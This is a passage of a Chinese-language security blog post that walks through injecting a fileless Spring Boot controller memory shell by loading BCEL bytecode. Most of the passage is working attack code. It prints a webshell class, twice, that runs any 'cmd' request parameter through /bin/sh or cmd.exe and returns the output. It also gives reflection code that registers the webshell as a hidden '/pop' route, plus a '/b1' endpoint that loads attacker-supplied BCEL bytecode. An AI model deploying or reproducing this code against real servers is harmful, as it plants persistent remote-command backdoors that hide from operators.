getParameter.invoke(request,<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            PrintWriter writer= (PrintWriter) getWriter.invoke(response);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                sendError.invoke(response,<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Boogipop Error~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object o, String f)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredField(f);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.get(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getMV</span><span class="params">(Object o, String m)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredMethod(m);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(m);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.invoke(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="内存马部分"><a href="#内存马部分" class="headerlink" title="内存马部分"></a>内存马部分</h2><p>先从当前线程获取一个classloader，方便我们之后反射获取类。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639275846-66ae6abf-97a3-4b17-aef6-8dd68b66d93d.png#averageHue=%232d2f2d&clientId=u1e300139-0fb9-4&from=paste&height=671&id=ud6e94651&originHeight=839&originWidth=1323&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1553646&status=done&style=none&taskId=uc96de213-d728-4d09-acbe-abd0f8fe57a&title=&width=1058.4" alt="image.png"><br>这一步获取到了WebAppClassLoader。然后我们回顾正常注入内存马的第一部，就是获取<code>currentRequestAttributesMethod</code>方法，然后反射调用。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639439757-451d403c-14b2-4871-99eb-06b55756b888.png#averageHue=%232c2f2c&clientId=u1e300139-0fb9-4&from=paste&height=676&id=u18a8a75b&originHeight=845&originWidth=1326&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1596156&status=done&style=none&taskId=ud288e650-cda9-41a1-877e-1193fa1b37c&title=&width=1060.8" alt="image.png"><br>这里可以看到request和response，但他们都有个后缀<code>Facade</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639757133-b42fd7ec-6c40-4384-919a-ea00343e0f79.png#averageHue=%232c2d28&clientId=u1e300139-0fb9-4&from=paste&height=419&id=u50cba3c5&originHeight=524&originWidth=1798&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1342413&status=done&style=none&taskId=u6f5a276c-6c8b-4e3b-95d2-690f24b1182&title=&width=1438.4" alt="image.png"><br>RequestFacade是对Request的一个封装，所以获取到他我们也可以进行一系列的处理。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639813403-469500ca-c0d1-4960-8251-4d46c3d8a0b9.png#averageHue=%232d302d&clientId=u1e300139-0fb9-4&from=paste&height=708&id=u6e8c34d1&originHeight=885&originWidth=1419&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1801646&status=done&style=none&taskId=u2e1a1dd5-68f7-4a23-a039-e042259cc44&title=&width=1135.2" alt="image.png"><br>到这里把所有用到的方法全部反射获取完后<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691639839646-c915eb16-f31d-4ce6-a70c-4eaddcda7155.png#averageHue=%232b2c28&clientId=u1e300139-0fb9-4&from=paste&height=421&id=ue8010fb6&originHeight=526&originWidth=1239&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=928865&status=done&style=none&taskId=ube9d8d30-6240-499c-bb44-774162c1ed3&title=&width=991.2" alt="image.png"><br>直接就这样输出就行了。springboot的全反射内存马相对还是比较简洁的。</p>
<h2 id="注入部分"><a href="#注入部分" class="headerlink" title="注入部分"></a>注入部分</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">springClassload</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获得standardcontext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">standardcontext</span> <span class="operator">=</span> resourcesField.get(Thread.currentThread().getContextClassLoader());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> standardcontext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//迭代获得TomcatEmbeddedContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">TomcatEmbeddedContext</span> <span class="operator">=</span> contextField.get(standardcontext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context2Field</span> <span class="operator">=</span> TomcatEmbeddedContext.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context2Field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取到了ApplicationContext</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> context2Field.get(TomcatEmbeddedContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">attributesField</span> <span class="operator">=</span> ApplicationContext.getClass().getDeclaredField(<span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">        attributesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">attributesMap</span> <span class="operator">=</span> (ConcurrentHashMap) attributesField.get(ApplicationContext);</span><br><span class="line">        <span class="comment">//这里springboot版本偏高，低版本有所不同。获取到AnnotationConfigServletWebServerApplication</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">springRoot</span> <span class="operator">=</span> attributesMap.get(<span class="string">&quot;org.springframework.web.context.WebApplicationContext.ROOT&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getBean</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.context.support.AbstractApplicationContext&quot;</span>).getDeclaredMethod(<span class="string">&quot;getBean&quot;</span>, Class.class);</span><br><span class="line">        <span class="comment">//最终获取到RequestMapping，结束。接下来注册路由</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> getBean.invoke(springRoot, RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">config</span> <span class="operator">=</span> configField.get(requestMappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">paths</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>).getDeclaredMethod(<span class="string">&quot;paths&quot;</span>, String[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">options</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;options&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$BuilderConfiguration&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">build</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo$DefaultBuilder&quot;</span>).getDeclaredMethod(<span class="string">&quot;build&quot;</span>);</span><br><span class="line">        paths.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        options.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        build.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder1</span> <span class="operator">=</span> paths.invoke(springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/pop&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">builder2</span> <span class="operator">=</span> options.invoke(builder1, config);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">requestMappingInfo</span> <span class="operator">=</span> build.invoke(builder2);</span><br><span class="line">        <span class="type">BcelInjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BcelInjectToController</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">shell</span> <span class="operator">=</span> BcelInjectToController.class.getMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">registerMapping</span> <span class="operator">=</span> springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>).getDeclaredMethod(<span class="string">&quot;registerMapping&quot;</span>, springClassload.loadClass(<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span>), Object.class, Method.class);</span><br><span class="line">        registerMapping.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        registerMapping.invoke(requestMappingHandlerMapping,requestMappingInfo,springControllerMemShell,shell);</span><br><span class="line">        System.out.println(<span class="string">&quot;inject successfully&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>我们需要获取到上述说到的核心，也就是context上下文，这里通过一系列的迭代获取<code>springRoot</code>上下文，再做接下来的处理。这一部分最重要的是获取到RequestMapping，因为spring的controller内存马都是依托这个的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640075400-75d6b516-b024-477a-bc45-85ca98a2a391.png#averageHue=%232d302d&clientId=u1e300139-0fb9-4&from=paste&height=614&id=u61f81e1e&originHeight=768&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1440372&status=done&style=none&taskId=u6733b376-047d-46a0-901b-00cf9d932da&title=&width=1054.4" alt="image.png"><br>获取到ApplicationContext，在这里其实可以做其他处理，比如注入tomcat内存马（通杀）。这个大家都不陌生，但这里是springboot，我们就按照spring内存马来。然后就是要获取spring的上下文对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640137801-e432d619-9152-4564-abb7-7bb116746e48.png#averageHue=%232f3430&clientId=u1e300139-0fb9-4&from=paste&height=549&id=ud95d3ac0&originHeight=686&originWidth=1314&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1279599&status=done&style=none&taskId=ud000e2d7-afdb-4776-a85a-7a807cbe4e8&title=&width=1051.2" alt="image.png"><br>attributesMap属性里有这个键值，取出来就好。接下来调用getbean方法，因为RequestMapping本身就被当做bean注册了。刚刚获取到的ROOT上下文实际上是<code>AnnotationConfigServletWebApplicationContext</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640288429-7ef68bcb-2ff7-42f6-9115-b190e7e40b4c.png#averageHue=%23313531&clientId=u1e300139-0fb9-4&from=paste&height=716&id=u427ae416&originHeight=895&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2479957&status=done&style=none&taskId=ucc443fb9-6de4-4929-83e4-31061e22b55&title=&width=1531.2" alt="image.png"><br>他是<code>AbstractApplicationContext</code>的实现类，所以有getBean方法可以直接获取，很方便。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640321680-6de9a96b-aba4-4562-a33e-81463a175ad8.png#averageHue=%232d302d&clientId=u1e300139-0fb9-4&from=paste&height=588&id=u008b5ce4&originHeight=735&originWidth=1360&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1446149&status=done&style=none&taskId=u231fc957-9352-4a00-99b5-f18445382ec&title=&width=1088" alt="image.png"><br>最终也是成功获取requestmapping，后续就是反射注册路由了，有个比较坑的地方就是paths方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640382777-1828616f-cb28-4d3f-907d-ed3848dcab79.png#averageHue=%232c2c27&clientId=u1e300139-0fb9-4&from=paste&height=110&id=uaf4f7062&originHeight=137&originWidth=653&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129899&status=done&style=none&taskId=uee373895-925a-40b8-bf30-f78c7f443b6&title=&width=522.4" alt="image.png"><br>是可变的字符串类型，反射获取类方法时用字符串数组就行，关键是反射触发的时候要强转为Object<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640426386-dd42e7e5-0d41-4fff-b341-713182c733b2.png#averageHue=%232d2b25&clientId=u1e300139-0fb9-4&from=paste&height=97&id=u75a634bd&originHeight=121&originWidth=639&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106274&status=done&style=none&taskId=u72ce43b5-8d9e-4187-a077-926ee5454f6&title=&width=511.2" alt="image.png"><br>然后就是注册恶意方法了，这里也有个坑，就是BCEL其实是不会识别内部类的，所以这里我为了演示直接把恶意的Controller注册为一个类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640473051-dd7c1d89-1e3a-4682-b418-56b84fe19ab4.png#averageHue=%232d302a&clientId=u1e300139-0fb9-4&from=paste&height=270&id=ua232933e&originHeight=338&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=622593&status=done&style=none&taskId=u85821322-b92f-4f25-ac62-973a378f8aa&title=&width=1000.8" alt="image.png"><br>然后反射触发就行了。实际上我们需要把一开始的内存马编译为BCEL字节码，然后用BCEL加载器加载，然后再反射获取这个类的方法，再注册。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691640597514-f8d0876b-0e2f-4313-a06b-8588f7b0e6ae.png#averageHue=%23423f38&clientId=u1e300139-0fb9-4&from=paste&height=174&id=u6660f788&originHeight=217&originWidth=1009&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30246&status=done&style=none&taskId=ufe33e608-4b82-4b09-aa7c-b0b0bb1024f&title=&width=807.2" alt="image.png"></p>
<h1 id="四、完整的BCEL内存马注入"><a href="#四、完整的BCEL内存马注入" class="headerlink" title="四、完整的BCEL内存马注入"></a>四、完整的BCEL内存马注入</h1><p>上述不是说需要先转为BCEL字节码吗。<br>注入路由准备如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/b1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(String code)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>很简洁的一个加载，首先把刚刚第一个内存马</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelInjectToController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelInjectToController</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelInjectToController</span><span class="params">(String aaa)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">springLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">currentRequestAttributesMethod</span> <span class="operator">=</span> springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>).getMethod(<span class="string">&quot;currentRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RequestFace</span> <span class="operator">=</span> currentRequestAttributesMethod.invoke(springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRequest</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getRequest.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getResponse</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">response</span> <span class="operator">=</span> getResponse.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getParameter</span> <span class="operator">=</span> request.getClass().getDeclaredMethod(<span class="string">&quot;getParameter&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">sendError</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;sendError&quot;</span>,<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd= (String) getParameter.invoke(request,<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            PrintWriter writer= (PrintWriter) getWriter.invoke(response);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                sendError.invoke(response,<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Boogipop Error~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object o, String f)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredField(f);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.get(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getMV</span><span class="params">(Object o, String m)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> o.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (var3 != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = var3.getDeclaredMethod(m);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                var3 = var3.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(m);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> var2.invoke(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译为BCEL字节码，这个的话可以写一个util去编译</p>
